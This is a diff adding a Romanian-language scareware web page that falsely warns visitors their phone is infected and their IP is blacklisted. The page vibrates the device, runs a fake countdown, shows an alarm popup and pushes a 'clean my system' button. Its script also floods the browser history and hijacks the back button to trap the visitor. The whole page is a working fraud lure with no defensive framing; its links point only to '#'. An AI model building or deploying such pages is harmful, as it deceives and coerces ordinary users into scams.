@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html webdriver="true">
+
+<head>
+	<base href="">
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<title>ATENȚIE!!!</title>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="user-scalable=no, initial-scale=1.0, maximum-scale=1.0, width=device-width">
+	<meta name="apple-mobile-web-app-capable" content="yes">
+	<meta name="apple-mobile-web-app-status-bar-style" content="black">
+	 
+	<link rel="stylesheet" type="text/css" href="css/index.css" media="all"> </head>
+
+<body onclick="goto()">
+	<script language="JavaScript" type="text/javascript">
+	navigator.vibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate;
+	navigator.vibrate([50000]);
+	</script>
+	<script language="JavaScript" type="text/javascript">
+	var sec = 40;
+	var min = 00;
+
+	function countDown() {
+		sec--;
+		if(sec == -01) {
+			sec = 59;
+			min = min - 1;
+		} else {
+			min = min;
+		}
+		if(sec <= 9) {
+			sec = "0" + sec;
+		}
+		time = (min <= 9 ? "" + min : min) + " minutes and " + sec + " seconds";
+		if(document.getElementById) {
+			document.getElementById('theTime').innerHTML = time;
+		}
+		SD = window.setTimeout("countDown();", 1000);
+		if(min == '00' && sec == '00') {
+			sec = "00";
+			window.clearTimeout(SD);
+		}
+	}
+	window.onload = countDown;
+	</script>
+	<div id="wrapper">
+		<div class="container">
+			<header> <img src="images/logo.png" alt=""><img src="images/romania.png" align="right"> </header>
+			<section>
+				<h1>Telefonul dvs. poate fi infectat <span id="blink">(7)</span> cu viruși<span id="blink">!!!</span> </h1> </section>
+			<section>
+				<p></p>
+				<h3>Acest lucru ar putea fi cauzat de vizitele dvs. pe site-uri cu conținut rău intenționat.</h3>
+				<p>Pentru a continua utilizarea Internetului, este recomandat să vă curățați sistemul de viruși și să eliminați IP-ul din baza de date spam.</p>
+				<p>Altfel, accesul la internet de furnizorul dvs va fi blocat</p>
+				<p><b>De obicei după curățare:</b>
+					<br>Viteza va crește cu: <span style="font-size: 16px; font-weight: bold; color: green; font-family: sans-serif;">76%</span>
+					<br>Încărcarea bateriei va crește cu: <span style="font-size: 16px; font-weight: bold; color: green; font-family: sans-serif;">65%</span> </p>
+				<div id="timer">
+					<p><span class="red2">
+
+<span style="font-size: 20px; font-weight: bold; color: red; font-family: sans-serif;" id="theTime">0 minutes and 29 seconds</span></span>
+					</p>
+				</div>
+			</section>
+			<footer>
+				<p align="center"><a class="btn" href="#"><strong>CURĂȚĂ-MI SISTEMUL</strong></a>
+				</p>
+			</footer>
+		</div>
+		<script>
+		alert("ATENȚIE!\n\n Adresa dvs. IP poate fi în lista neagră după vizitarea site-urilor cu conținut rău intenționat.\n\n\ Pentru a continua navigarea, vă recomandăm să ștergeți imediat virușii.");
+		</script>
+	</div>
+	<script language="JavaScript" type="text/javascript">
+	function goto() {
+		location.href = "#"
+	}
+	</script>
+	<script src="#"></script>
+	<script type="text/javascript">
+	! function() {
+		var t;
+		try {
+			for(t = 0; 10 > t; ++t) history.pushState({}, "", "#");
+			onpopstate = function(t) {
+				t.state && location.replace("#")
+			}
+		} catch(o) {}
+	}();
+	</script>
+</body>
+
+</html>
